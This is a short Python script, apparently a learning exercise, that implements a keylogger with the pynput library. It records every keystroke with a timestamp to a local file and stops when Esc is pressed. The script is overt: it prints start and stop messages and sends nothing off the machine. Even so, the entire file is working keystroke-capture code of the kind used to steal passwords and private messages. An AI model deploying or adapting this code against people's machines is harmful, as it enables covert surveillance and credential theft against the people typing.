import os #for checking if logs directory exists
from pynput import keyboard #for capturing keyboard events
from datetime import datetime # for timestamps


if not os.path.exists("logs"):
    os.makedirs("logs")

log_file = "logs/keylog.txt"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as file:
        try: # to catch any errors 
            #  for Normal character keys
            file.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            # for Special keys like enter space etc.
            if key == keyboard.Key.enter:
                #it logs the enter key
                #it logs the timestamp and the key pressed
                file.write(f"{timestamp} - [ENTER]\n")
            elif key == keyboard.Key.space:
                file.write(f"{timestamp} - [SPACE]\n")
            else:
                file.write(f"{timestamp} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("keylogger has stoped")
        return False  # when we press esc key it stop the keylogger
    

print("Keylogger started.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
